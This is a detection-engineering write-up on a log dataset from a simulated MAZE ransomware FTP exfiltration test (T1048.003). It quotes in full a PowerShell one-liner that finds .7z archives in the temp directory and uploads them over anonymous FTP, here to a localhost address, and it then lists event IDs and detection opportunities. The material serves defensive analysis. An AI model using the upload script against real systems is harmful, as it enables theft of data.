# T1048.003-6: Exfiltration Over Unencrypted Non-C2 Protocol — MAZE FTP Upload

## Technique Context

T1048.003 covers data exfiltration over unencrypted protocols that are not part of the command and control infrastructure. Attackers use legitimate protocols like FTP, HTTP, SMB, or SMTP to blend data exfiltration with normal network traffic. The MAZE ransomware group notably used FTP for stealing data before encryption, making this a real-world attack pattern.

Detection engineers focus on monitoring for unusual outbound connections, large data transfers, compression activities before network transfers, and the use of built-in system tools for network operations. PowerShell-based exfiltration is particularly common as it provides native .NET networking capabilities without requiring additional tools.

## What This Dataset Contains

This dataset captures a PowerShell-based FTP exfiltration attempt that simulates MAZE ransomware behavior. The core technique appears in Security event 4688 with the full command line:

`"powershell.exe" & {$Dir_to_copy = \""$env:windir\temp\""; $ftp = \""ftp://127.0.0.1/\""; $web_client = New-Object System.Net.WebClient; $web_client.Credentials = New-Object System.Net.NetworkCredential('', ''); if (test-connection -count 1 -computername \""127.0.0.1\"" -quiet) {foreach($file in (dir $Dir_to_copy \""*.7z\"")) {echo \""Uploading $file...\""; $uri = New-Object System.Uri($ftp+$file.name); $web_client.UploadFile($uri, $file.FullName)}} else {echo \""FTP Server Unreachable. Please verify the server address in input args and try again.\""}}`

The PowerShell logs capture the script execution with detailed cmdlet invocations including `New-Object System.Net.WebClient`, `New-Object System.Net.NetworkCredential`, `Test-Connection`, and `Get-ChildItem` searching for "*.7z" files in `C:\Windows\temp`. The script attempts to connect to an FTP server at 127.0.0.1 to upload compressed archives.

Sysmon provides process creation events for both the initial PowerShell process and a spawned `whoami.exe` process (EID 1), along with image loads showing the loading of `urlmon.dll` which supports network operations. The dataset includes process access events (EID 10) showing inter-process communication between PowerShell instances.

## What This Dataset Does Not Contain

The dataset lacks evidence of actual network connections, suggesting the FTP server was not accessible or the connection failed. There are no Sysmon network connection events (EID 3) that would indicate successful FTP communication. No file access events show the technique successfully reading target files for exfiltration.

Notably absent are any 7z archive files being created or accessed in the temp directory, indicating the test environment didn't contain the target compressed files the script was designed to exfiltrate. The script's error handling branch ("FTP Server Unreachable") likely executed, though this isn't explicitly captured in the logs.

Windows Defender appears to have allowed the PowerShell execution without blocking it, as evidenced by the normal exit codes (0x0) in Security events 4689.

## Assessment

This dataset provides excellent coverage of PowerShell-based exfiltration preparation activities but limited evidence of successful data transfer. The Security channel captures the full command line with embedded FTP credentials and target file patterns, while PowerShell logs show the systematic cmdlet execution pattern typical of .NET-based network operations.

The telemetry is strongest for detecting the reconnaissance and setup phases of FTP exfiltration - file enumeration, network connectivity testing, and WebClient instantiation. However, it's weaker for detecting successful data theft since no actual transfers occurred.

For detection engineering, this data effectively demonstrates the behavioral patterns that would occur regardless of whether files are present or the FTP server is reachable, making it valuable for building preventive detections.

## Detection Opportunities Present in This Data

1. **PowerShell WebClient instantiation** - Security 4688 and PowerShell 4103 events show `New-Object System.Net.WebClient` which is uncommon in legitimate administrative scripts

2. **FTP URL construction in PowerShell** - The command line contains `ftp://127.0.0.1/` and URI object creation, indicating FTP protocol usage

3. **Compressed file enumeration** - PowerShell 4103 events show `Get-ChildItem` with "*.7z" filter in temp directories, suggesting preparation for bulk data transfer

4. **Anonymous FTP credentials** - The script creates NetworkCredential objects with empty username/password strings, typical of anonymous FTP access

5. **Network connectivity testing** - PowerShell 4103 shows `Test-Connection` to the same IP address used for FTP, indicating reconnaissance before exfiltration

6. **Process chain analysis** - PowerShell spawning additional PowerShell instances with network-related command lines (Sysmon EID 1)

7. **Embedded protocol keywords** - Command line contains multiple exfiltration-related strings: "Uploading", "FTP Server Unreachable", and file upload logic

8. **urlmon.dll loading** - Sysmon EID 7 shows PowerShell loading network-related libraries that support file transfer operations
